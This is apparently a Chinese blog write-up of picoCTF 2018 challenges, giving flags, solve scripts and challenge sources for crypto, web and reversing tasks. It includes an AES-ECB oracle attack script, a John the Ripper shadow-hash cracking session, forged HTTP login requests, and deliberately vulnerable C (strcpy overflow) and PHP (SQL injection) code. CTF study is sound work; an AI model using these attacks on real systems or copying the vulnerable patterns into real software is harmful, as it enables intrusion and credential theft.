#include #define FLAGSIZE_MAX 64 char flag[FLAGSIZE_MAX]; void sigsegv_handler(int sig) { fprintf(stderr, \"%s\\n\", flag); fflush(stderr); exit(1); } void vuln(char *input){ char buf[16]; strcpy(buf, input); } int main(int argc, char **argv){ FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n\"); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); gid_t gid = getegid(); setresgid(gid, gid, gid); if (argc \u003e 1) { vuln(argv[1]); printf(\"Thanks! Received: %s\", argv[1]); } else printf(\"This program takes 1 argument.\\n\"); return 0; } Cryptography Crypto Warmup 1 1 2 \u003e\u003e\u003e print \"picoCTF{%s}\"%''.join(map(lambda x:chr((ord(x[0])-ord(x[1]))%26+ord('a')),zip('llkjmlmpadkkc','thisisalilkey'))).upper() picoCTF{SECRETMESSAGE} caesar cipher 2 1 2 ''.join(map(lambda x:chr((ord(x)+32)%0xff),'PICO#4\u0026[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]')) # 'picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}' hertz 替换密码。\n在线工具：\nhttps://www.guballa.de/substitution-solver https://quipqiup.com/ blaise’s cipher 在线解密即可：https://www.dcode.fr/vigenere-cipher 。逐步得到KEY长度为4，KEY为FLAG\npicoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}\nSafe RSA 1 2 3 4 5 6 import gmpy2,binascii e=3 c=2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125 m=gmpy2.iroot(c,e)[0] print binascii.unhexlify(hex(m).strip('lL')[2:]) # picoCTF{e_w4y_t00_sm411_9f5d2464} 【X】Super Safe RSA 参考RSA的广播攻击 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #!/usr/bin/env python # -*- coding: utf-8 -*- # __author__ = findneo import gmpy2,re from pwn import connect from time import sleep c=[] n=[] with open('buf','r') as f: for i in f.readlines(): j=i.strip().split(' ') c.append(int(j[0])) n.append(int(j[1])) print \"mytag:\",len(c) with open('buf','a') as f: while len(c)\u003c65538: r=connect('2018shell2.picoctf.com',24039) res=r.recv() g=re.findall('c: (\\d+)\\nn: (\\d+)\\n.*',res)[0] f.write(' '.join(g)+'\\n') c.append(g[0]) n.append(g[1]) r.close() # sleep(0.1) if len(c)%1000==0: print 'mytag:',len(c) def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d cura %= curm return (cura % curm, curm) #(解,最小公倍数) print GCRT(n,c)[0] HEEEEEEERE’S Johnny! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cp /usr/share/wordlists/rockyou.txt.gz . gunzip rockyou.txt.gz unshadow passwd shadow \u003e unshadowes.txt john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt Warning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\" Use the \"--format=crypt\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Press 'q' or Ctrl-C to abort, almost any other key for status thematrix (root) 1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra Use the \"--show\" option to display all of the cracked passwords reliably Session completed nc 2018shell2.picoctf.com 38860 Username: root Password: thematrix picoCTF{J0hn_1$_R1pp3d_4e5aa29e} rsa-madlibs 回答一些简单的RSA知识。可以参考CTF中常见的RSA相关问题总结 一文。\n发现一个做这类题目的好方法，python solve.py | nc 2018shell2.picoctf.com 18148 ，不到必要就不去处理各种奇怪的数据。\npicoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}\nSpyFi 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/python2 -u from Crypto.Cipher import AES agent_code = \"\"\"flag\"\"\" def pad(message): if len(message) % 16 != 0: message = message + '0'*(16 - len(message)%16 ) return message def encrypt(key, plain): cipher = AES.new( key.decode('hex'), AES.MODE_ECB ) return cipher.encrypt(plain).encode('hex') welcome = \"Welcome, Agent 006!\" print welcome sitrep = raw_input(\"Please enter your situation report: \") message = \"\"\"Agent, Greetings. My situation report is as follows: {0} My agent identifying code is: {1}. Down with the Soviets, 006 \"\"\".format( sitrep, agent_code ) message = pad(message) print encrypt( \"\"\"key\"\"\", message ) AES的ECB模式存在选择明文攻击。\n当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。\n将message分组输出，看到爆破flag的机会。\n写完代码验证可行。\n最后成果：\npicoCTF{@g3nt6_1$_th3_c00l3$t_8124762}\n全部代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 def part_msg(message,part_length=16): sl=len(message) pl=part_length m=[message[pl*i:min(sl,pl*i+pl)] for i in range(sl/pl+(sl%pl\u003e0))] return m msg=['Agent,\\nGreetings. My situation report is as follows:\\n','\\nMy agent identifying code is: ','.\\nDown with the Soviets,\\n006\\n',] from pwn import connect import string import time def solve(): cnt=0 flag='picoCTF{@' # sitrep,agent_code='','' # message =msg[0] +sitrep+msg[1]+agent_code+msg[2] for j in range(38-len(flag)): for i in string.printable: # print \"flag:\",i r=connect(\"2018shell2.picoctf.com\",37131) cnt+=1;time.sleep(1) prompt=r.recvuntil(\"report: \") # 113 + (11+16+38+10) + 38 = 226 base='fying code is: '+flag sitrep='@'*11+base[-15:]+i+'@'*(38-len(flag)+10) # agent_code=\"#\"*38 # message =msg[0] +sitrep+msg[1]+agent_code+msg[2] # print '\\n'.join(map(repr,part_msg(message))) r.sendline(sitrep) response=r.recv() # print len(response) tmp=part_msg(response,32) # print len(tmp) # print '\\n'.join(tmp) r.close() # print len(msg[0]+sitrep+msg[1]+flag)/16 if tmp[4]==tmp[len(msg[0]+sitrep+msg[1]+flag)/16]: flag+=i break print \"flag:\",flag,cnt print \"flag:\",time.asctime() solve() print \"flag:\",time.asctime() Web Exploitation Buttons 1 2 curl http://2018shell2.picoctf.com:65107/button2.php --data \"123\" Well done, your flag is: picoCTF{button_button_whose_got_the_button_91f6f39a} Artisinal Handcrafted HTTP 3 先请求一下login页面：\n1 2 GET /login HTTP/1.1 Host: flag.local 发现表单是这样的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 HTTP/1.1 200 OK x-powered-by: Express content-type: text/html; charset=utf-8 content-length: 498 etag: W/\"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I\" date: Sun, 07 Oct 2018 18:33:21 GMT connection: close \u003chtml\u003e \u003chead\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"main.css\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cheader\u003e \u003ch1\u003eReal Business Internal Flag Server\u003c/h1\u003e \u003ca href=\"/login\"\u003eLogin\u003c/a\u003e \u003c/header\u003e \u003cmain\u003e \u003ch2\u003eLog In\u003c/h2\u003e \u003cform method=\"POST\" action=\"login\"\u003e \u003cinput type=\"text\" name=\"user\" placeholder=\"Username\" /\u003e \u003cinput type=\"password\" name=\"pass\" placeholder=\"Password\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e \u003c/main\u003e \u003c/body\u003e \u003c/html\u003e 再请求登陆：\n1 2 3 4 5 6 POST /login HTTP/1.1 Host: flag.local Content-Length: 38 Content-Type: application/x-www-form-urlencoded user=realbusinessuser\u0026pass=potoooooooo 响应：\n1 2 3 4 5 6 7 8 9 10 11 HTTP/1.1 302 Found x-powered-by: Express set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/ location: / vary: Accept content-type: text/plain; charset=utf-8 content-length: 23 date: Tue, 09 Oct 2018 15:11:46 GMT connection: close Found. Redirecting to / 带上cookie请求：\n1 2 3 GET / HTTP/1.1 Host: flag.local cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/ 响应：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 HTTP/1.1 200 OK x-powered-by: Express content-type: text/html; charset=utf-8 content-length: 438 etag: W/\"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg\" date: Tue, 09 Oct 2018 15:12:57 GMT connection: close \u003chtml\u003e \u003chead\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"main.css\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cheader\u003e \u003ch1\u003eReal Business Internal Flag Server\u003c/h1\u003e \u003cdiv class=\"user\"\u003eReal Business Employee\u003c/div\u003e \u003ca href=\"/logout\"\u003eLogout\u003c/a\u003e \u003c/header\u003e \u003cmain\u003e \u003cp\u003eHello \u003cb\u003eReal Business Employee\u003c/b\u003e! Today's flag is: \u003ccode\u003epicoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}\u003c/code\u003e.\u003c/p\u003e \u003c/main\u003e \u003c/body\u003e \u003c/html\u003e 【X】Secure Logon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 from flask import Flask, render_template, request, url_for, redirect, make_response, flash import json from hashlib import md5 from base64 import b64decode from base64 import b64encode from Crypto import Random from Crypto.Cipher import AES app = Flask(__name__) app.secret_key = 'seed removed' flag_value = 'flag removed' BLOCK_SIZE = 16 # Bytes pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \\ chr(BLOCK_SIZE - len(s) % BLOCK_SIZE) unpad = lambda s: s[:-ord(s[len(s) - 1:])] @app.route(\"/\") def main(): return render_template('index.html') @app.route('/login', methods=['GET', 'POST']) def login(): if request.form['user'] == 'admin': message = \"I'm sorry the admin password is super secure. You're not getting in that way.\" category = 'danger' flash(message, category) return render_template('index.html') resp = make_response(redirect(\"/flag\")) cookie = {} cookie['password'] = request.form['password'] cookie['username'] = request.form['user'] cookie['admin'] = 0 print(cookie) cookie_data = json.dumps(cookie, sort_keys=True) encrypted = AESCipher(app.secret_key).encrypt(cookie_data) print(encrypted) resp.set_cookie('cookie', encrypted) return resp @app.route('/logout') def logout(): resp = make_response(redirect(\"/\")) resp.set_cookie('cookie', '', expires=0) return resp @app.route('/flag', methods=['GET']) def flag(): try: encrypted = request.cookies['cookie'] except KeyError: flash(\"Error: Please log-in again.\") return redirect(url_for('main')) data = AESCipher(app.secret_key).decrypt(encrypted) data = json.loads(data) try: check = data['admin'] except KeyError: check = 0 if check == 1: return render_template('flag.html', value=flag_value) flash(\"Success: You logged in! Not sure you'll be able to see the flag though.\", \"success\") return render_template('not-flag.html', cookie=data) class AESCipher: \"\"\" Usage: c = AESCipher('password').encrypt('message') m = AESCipher('password').decrypt(c) Tested under Python 3 and PyCrypto 2.6.1. \"\"\" def __init__(self, key): self.key = md5(key.encode('utf8')).hexdigest() def encrypt(self, raw): raw = pad(raw) iv = Random.new().read(AES.block_size) cipher = AES.new(self.key, AES.MODE_CBC, iv) return b64encode(iv + cipher.encrypt(raw)) def decrypt(self, enc): enc = b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv) return unpad(cipher.decrypt(enc[16:])).decode('utf8') if __name__ == \"__main__\": app.run() 【X】A Simple Question 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u003c?php include \"config.php\"; ini_set('error_reporting', E_ALL); ini_set('display_errors', 'On'); $answer = $_POST[\"answer\"]; $debug = $_POST[\"debug\"]; $query = \"SELECT * FROM answers WHERE answer='$answer'\"; echo \"\"; echo \"SQL query: \", htmlspecialchars($query), \"\\n\"; echo \"\"; ?\u003e \u003c?php $con = new SQLite3($database_file); $result = $con-\u003equery($query); $row = $result-\u003efetchArray(); if($answer == $CANARY) { echo \"Perfect!\"; echo \"Your flag is: $FLAG\n\"; } elseif ($row) { echo \"You are so close.\"; } else { echo \"Wrong.\"; } ?\u003e reversing assembly-0 What does asm0(0xd8,0x7a) return? 0x7a。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 .intel_syntax noprefix .bits 32 .global asm0 asm0: push\tebp mov\tebp,esp mov\teax,DWORD PTR [ebp+0x8] mov\tebx,DWORD PTR [ebp+0xc] mov\teax,ebx mov\tesp,ebp pop\tebp\tret assembly-1 What does asm1(0xcd) return? 0xca。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 .intel_syntax noprefix .bits 32 .global asm1 asm1: push\tebp mov\tebp,esp cmp\tDWORD PTR [ebp+0x8],0xde jg part_a\tcmp\tDWORD PTR [ebp+0x8],0x8 jne\tpart_b mov\teax,DWORD PTR [ebp+0x8] add\teax,0x3 jmp\tpart_d part_a: cmp\tDWORD PTR [ebp+0x8],0x4e jne\tpart_c mov\teax,DWORD PTR [ebp+0x8] sub\teax,0x3 jmp\tpart_d part_b: mov\teax,DWORD PTR [ebp+0x8] sub\teax,0x3 jmp\tpart_d cmp\tDWORD PTR [ebp+0x8],0xee jne\tpart_c mov\teax,DWORD PTR [ebp+0x8] sub\teax,0x3 jmp\tpart_d part_c: mov\teax,DWORD PTR [ebp+0x8] add\teax,0x3 part_d: pop\tebp ret assembly-2 What does asm2(0x7,0x28) return? hex(int((0xa1df-0x7)/float(0x76))+1+0x28) =\u003e 0x188\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 .intel_syntax noprefix .bits 32 .global asm2 asm2: push ebp mov ebp,esp sub esp,0x10 mov eax,DWORD PTR [ebp+0xc] mov DWORD PTR [ebp-0x4],eax mov eax,DWORD PTR [ebp+0x8] mov\tDWORD PTR [ebp-0x8],eax jmp part_b part_a:\tadd DWORD PTR [ebp-0x4],0x1 add\tDWORD PTR [ebp+0x8],0x76 part_b:\tcmp DWORD PTR [ebp+0x8],0xa1de jle part_a mov eax,DWORD PTR [ebp-0x4] mov\tesp,ebp pop\tebp ret assembly-3 What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return? 0x478\n1 2 3 ebp+0x8=\u003e0xbda42100 ebp+0xc=\u003e0xb98dd6a5 ebp+0x10=\u003e0xecded223 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .intel_syntax noprefix .bits 32 .global asm3 asm3: push ebp mov ebp,esp mov eax,0xbc;0xbc xor al,al;0x00 mov ah,BYTE PTR [ebp+0x9];0x2100 sal ax,0x10;0x0000 sub al,BYTE PTR [ebp+0xc];0x005b add ah,BYTE PTR [ebp+0xd];0xd65b xor ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478 mov esp, ebp pop ebp ret 有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 sub 0x00,0xa5 的值是0x100-0xa5=0x5b 。 三是WORD PTR [ebp+0x10] 的值是0xd223 而非0x23d2 。\n可参考 此处 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 section .text global asm3 asm3: push ebp mov ebp,esp mov\teax,0x19 xor\tal,al mov\tah,BYTE [ebp+0xa] sal\tax,0x10 sub\tal,BYTE [ebp+0xd] add\tah,BYTE [ebp+0xc] xor\tax,WORD [ebp+0x12] mov\tesp, ebp pop\tebp ret ################## #include extern int asm3(int a, int b, int c); int main(void) { printf(\"0x%x\\n\", asm3(0xb5e8e971,0xc6b58a95,0xe20737e9)); return 0; } ################## [andrei@jacky 15:27:00] ~/Documents/pico/3 ——\u003e nasm -f elf32 end_asm_rev.S -o asmfun.o [andrei@jacky 15:27:42] ~/Documents/pico/3 ——\u003e gcc sol.c asmfun.o -o sol -m32 [andrei@jacky 15:27:59] ~/Documents/pico/3 ——\u003e ./sol assembly-4 1 2 3 4 root@kali:~/ctf/pico18# nasm -f elf32 comp.nasm -o comp.o root@kali:~/ctf/pico18# gcc -m32 -o comp comp.o root@kali:~/ctf/pico18# ./comp picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_32429699163 picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}\n","wordCount":"4955","inLanguage":"en","datePublished":"2018-10-11T22:07:27+08:00","dateModified":"2018-10-11T22:07:27+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/180929-picoctf/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>picoCTF-2018 解题报告</h1><div class=post-meta><span title='2018-10-11 22:07:27 +0800 CST'>October 11, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/180929-picoctf.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#forensics aria-label=Forensics>Forensics</a><ul><li><a href=#forensics-warmup-1 aria-label="Forensics Warmup 1">Forensics Warmup 1</a></li><li><a href=#forensics-warmup-2 aria-label="Forensics Warmup 2">Forensics Warmup 2</a></li><li><a href=#desrouleaux aria-label=Desrouleaux>Desrouleaux</a></li><li><a href=#reading-between-the-eyes aria-label="Reading Between the Eyes">Reading Between the Eyes</a></li><li><a href=#recovering-from-the-snap aria-label="Recovering From the Snap">Recovering From the Snap</a></li><li><a href=#admin-panel aria-label="admin panel">admin panel</a></li><li><a href=#hex-editor aria-label="hex editor">hex editor</a></li><li><a href=#truly-an-artist aria-label="Truly an Artist">Truly an Artist</a></li><li><a href=#now-you-dont aria-label="now you don&amp;rsquo;t">now you don&rsquo;t</a></li><li><a href=#ext-super-magic aria-label="Ext Super Magic">Ext Super Magic</a></li><li><a href=#lying-out aria-label="Lying Out">Lying Out</a></li><li><a href=#whats-my-name aria-label="What&amp;rsquo;s My Name?">What&rsquo;s My Name?</a></li><li><a href=#malware-shops aria-label="Malware Shops">Malware Shops</a></li><li><a href=#loadsomebits aria-label=LoadSomeBits>LoadSomeBits</a></li><li><a href=#core aria-label=core>core</a></li></ul></li><li><a href=#general-skills aria-label="General Skills">General Skills</a><ul><li><a href=#absolutely-relative aria-label="absolutely relative">absolutely relative</a></li><li><a href=#aca-shell-a aria-label=Aca-Shell-A>Aca-Shell-A</a></li><li><a href=#in-out-error aria-label="in out error">in out error</a></li><li><a href=#learn-gdb aria-label="learn gdb">learn gdb</a></li><li><a href=#store aria-label=store>store</a></li><li><a href=#roulette aria-label=roulette>roulette</a></li><li><a href=#scriptme aria-label=scriptme>scriptme</a></li></ul></li><li><a href=#binary-exploitation aria-label="binary exploitation">binary exploitation</a><ul><li><a href=#buffer-overflow-0 aria-label="buffer overflow 0">buffer overflow 0</a></li></ul></li><li><a href=#cryptography aria-label=Cryptography>Cryptography</a><ul><li><a href=#crypto-warmup-1 aria-label="Crypto Warmup 1">Crypto Warmup 1</a></li><li><a href=#caesar-cipher-2 aria-label="caesar cipher 2">caesar cipher 2</a></li><li><a href=#hertz aria-label=hertz>hertz</a></li><li><a href=#blaises-cipher aria-label="blaise&amp;rsquo;s cipher">blaise&rsquo;s cipher</a></li><li><a href=#safe-rsa aria-label="Safe RSA">Safe RSA</a></li><li><a href=#xsuper-safe-rsa aria-label="【X】Super Safe RSA">【X】Super Safe RSA</a></li><li><a href=#heeeeeeeres-johnny aria-label="HEEEEEEERE&amp;rsquo;S Johnny!">HEEEEEEERE&rsquo;S Johnny!</a></li><li><a href=#rsa-madlibs aria-label=rsa-madlibs>rsa-madlibs</a></li><li><a href=#spyfi aria-label=SpyFi>SpyFi</a></li></ul></li><li><a href=#web-exploitation aria-label="Web Exploitation">Web Exploitation</a><ul><li><a href=#buttons aria-label=Buttons>Buttons</a></li><li><a href=#artisinal-handcrafted-http-3 aria-label="Artisinal Handcrafted HTTP 3">Artisinal Handcrafted HTTP 3</a></li><li><a href=#xsecure-logon aria-label="【X】Secure Logon">【X】Secure Logon</a></li><li><a href=#xa-simple-question aria-label="【X】A Simple Question">【X】A Simple Question</a></li></ul></li><li><a href=#reversing aria-label=reversing>reversing</a><ul><li><a href=#assembly-0 aria-label=assembly-0>assembly-0</a></li><li><a href=#assembly-1 aria-label=assembly-1>assembly-1</a></li><li><a href=#assembly-2 aria-label=assembly-2>assembly-2</a></li><li><a href=#assembly-3 aria-label=assembly-3>assembly-3</a></li><li><a href=#assembly-4 aria-label=assembly-4>assembly-4</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p><img loading=lazy src=72c5b401f19f82592.png alt></p><p>题目：</p><ul><li><a href=https://2018game.picoctf.com/problems>https://2018game.picoctf.com/problems</a></li><li>备用：https://findneo.github.io/p/picoCTF-2018-Problems.html</li><li>附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf</li></ul><h1 id=forensics>Forensics<a hidden class=anchor aria-hidden=true href=#forensics>#</a></h1><h2 id=forensics-warmup-1>Forensics Warmup 1<a hidden class=anchor aria-hidden=true href=#forensics-warmup-1>#</a></h2><p><code>picoCTF{welcome_to_forensics}</code></p><h2 id=forensics-warmup-2>Forensics Warmup 2<a hidden class=anchor aria-hidden=true href=#forensics-warmup-2>#</a></h2><p><code>picoCTF{extensions_are_a_lie}</code></p><h2 id=desrouleaux>Desrouleaux<a hidden class=anchor aria-hidden=true href=#desrouleaux>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-18>18</a>
